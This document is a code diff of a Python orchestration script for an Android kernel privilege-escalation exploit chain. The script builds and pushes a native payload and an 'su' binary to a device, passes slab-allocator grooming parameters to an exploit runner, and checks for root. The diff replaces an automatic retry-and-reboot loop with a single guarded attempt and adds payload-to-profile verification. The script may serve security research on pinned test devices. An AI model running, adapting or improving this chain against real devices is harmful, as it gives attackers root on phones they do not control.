@@ -29,6 +29,7 @@ from ghostlock_profile import (  # noqa: E402
     nearest_profile,
     profile_by_id,
     public_kernel_identity,
+    verify_payload_profile_binding,
 )
 
 
@@ -38,7 +39,6 @@ PINNED_NDK_VERSION = "28.2.13676358"
 NDK_TARGET_COMPILER = "aarch64-linux-android35-clang"
 RUNNER = ROOT / "runner/ghostlock_prod_runner.py"
 REDACTOR = ROOT / "tools/redact_report.py"
-RUN_ATTEMPTS = 3
 REMOTE_PAYLOAD = "/data/local/tmp/ghostlock-aipin.so"
 REMOTE_SU = "/data/local/tmp/su"
 DEFAULT_MIN_BATTERY = 20
@@ -356,6 +356,10 @@ def build_payload(profile: TargetProfile, ndk_arg: str | None) -> tuple[Path, st
     if not payload.is_file():
         raise GhostLockError(f"build succeeded without producing {payload}")
     digest = sha256(payload)
+    try:
+        verify_payload_profile_binding(payload, profile, digest)
+    except ProfileError as exc:
+        raise GhostLockError(str(exc)) from exc
     print(f"Payload:     {payload}")
     print(f"SHA-256:     {digest}")
     return payload, digest
@@ -430,7 +434,7 @@ def evidence_path(requested: str | None) -> Path:
         path = Path(requested).expanduser().resolve()
     else:
         stamp = datetime.now(timezone.utc).strftime("%Y%m%d-%H%M%SZ")
-        path = Path("/private/tmp") / f"ghostlock-aipin-{stamp}"
+        path = Path(tempfile.gettempdir()) / f"ghostlock-aipin-{stamp}"
     if path.exists():
         raise GhostLockError(f"evidence directory already exists: {path}")
     path.parent.mkdir(parents=True, exist_ok=True)
@@ -514,25 +518,40 @@ def build_runner_argv(
     serial: str,
     profile: TargetProfile,
     payload_sha256: str,
-    bugreport: Path,
     output_dir: Path,
+    min_battery: int,
+    retain_bugreport: bool,
+    slot: str | None = None,
 ) -> list[str]:
     symbols = Path(profile.symbols_path)
-    slot = info_slot(serial)
-    return [
+    geometry = profile.allocator_geometry
+    command = [
         sys.executable,
         str(RUNNER),
         "--serial", serial,
         "--expected-fingerprint", profile.fingerprint,
-        "--expected-slot", slot,
+        "--expected-kernel-substring", profile.kernel_build_marker,
+        "--profile-id", profile.profile_id,
+        "--profile-sha256", profile.manifest_sha256,
+        "--kernel-image-sha256", profile.kernel_image_sha256,
         "--symbols", str(symbols),
-        "--bugreport", str(bugreport),
         "--payload-sha256", payload_sha256,
         "--remote-payload", REMOTE_PAYLOAD,
         "--remote-su", REMOTE_SU,
+        "--mm-object-size", str(geometry.object_size),
+        "--mm-slab-size", str(geometry.slab_size),
+        "--mm-order", str(geometry.order),
+        "--mm-objects-per-slab", str(geometry.objects_per_slab),
+        "--mm-cpu-partial", str(geometry.cpu_partial),
+        "--min-battery", str(min_battery),
         "--output-dir", str(output_dir),
         "--execute",
     ]
+    if slot is not None:
+        command.extend(("--expected-slot", slot))
+    if retain_bugreport:
+        command.append("--retain-bugreport")
+    return command
 
 
 def info_slot(serial: str) -> str:
@@ -590,53 +609,24 @@ def command_run(args: argparse.Namespace) -> int:
     push_payload(serial, payload, digest)
 
     output = evidence_path(args.output_dir)
-    started = time.time()
-    summary = ""
-    for attempt in range(1, RUN_ATTEMPTS + 1):
-        print(f"\n=== root attempt {attempt}/{RUN_ATTEMPTS} ===")
-        bugreport_parent = Path(tempfile.mkdtemp(prefix="ghostlock-br-"))
-        bugreport = bugreport_parent / "bugreport.zip"
-        capture_bugreport(serial, bugreport)
-
-        command = build_runner_argv(
-            serial=serial,
-            profile=profile,
-            payload_sha256=digest,
-            bugreport=bugreport,
-            output_dir=output,
-        )
-        print(f"Private log: {output}")
-        print("Starting guarded exploit chain …")
-        result = subprocess.run(command, cwd=ROOT, check=False)
-
-        if verify_root(serial):
-            elapsed = int(time.time() - started)
-            summary = f"root achieved on attempt {attempt}/{RUN_ATTEMPTS} ({elapsed}s)"
-            break
-
-        # A failed attempt can leave the device rebooting; wait it out and
-        # re-stage (fresh boot = fresh Enforcing state and fresh delta).
-        print("attempt failed; waiting for the device before the next one …")
-        wait_for_device(serial, seconds=300)
-        time.sleep(20)
-        info = inspect_device(serial)
-        if info.selinux == "Permissive":
-            print("boot came back permissive; rebooting once more …")
-            adb(serial, "reboot")
-            wait_for_device(serial, seconds=300)
-            time.sleep(20)
-    else:
-        elapsed = int(time.time() - started)
+    command = build_runner_argv(
+        serial=serial,
+        profile=profile,
+        payload_sha256=digest,
+        output_dir=output,
+        min_battery=args.min_battery,
+        retain_bugreport=args.retain_bugreport,
+        slot=info.slot,
+    )
+    print(f"Private log: {output}")
+    print("Starting one guarded exploit attempt …")
+    result = subprocess.run(command, cwd=ROOT, check=False)
+    if result.returncode != 0:
         raise GhostLockError(
-            f"no root after {RUN_ATTEMPTS} attempts ({elapsed}s); "
-            "reboot the pin and try again on a fresh boot"
+            "guarded attempt did not complete; reboot before any retry"
         )
 
-    if args.retain_bugreport:
-        keep = output / "bugreport.zip"
-        shutil.copy(bugreport, keep)
-
-    print(f"\nChain completed. {summary}")
+    print("\nChain completed.")
     print("\nIndependent fresh-shell verification:")
     if not verify_root(serial):
         raise GhostLockError("runner completed but independent root verification failed")
